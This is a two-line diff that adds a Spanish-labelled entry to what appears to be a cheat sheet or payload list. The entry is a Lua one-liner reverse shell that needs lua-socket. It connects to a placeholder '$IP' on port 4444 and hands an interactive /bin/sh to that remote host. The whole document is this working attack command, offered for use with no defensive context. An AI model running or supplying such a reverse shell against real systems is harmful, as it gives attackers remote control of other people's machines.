@@ -1,0 +1,2 @@
+▶ Reverse Shell en una Línea (Requiere lua-socket):
+  lua -e "require('socket');require('os');t=socket.tcp();t:connect('$IP','4444');os.execute('/bin/sh -i <&3 >&3 2>&3');"
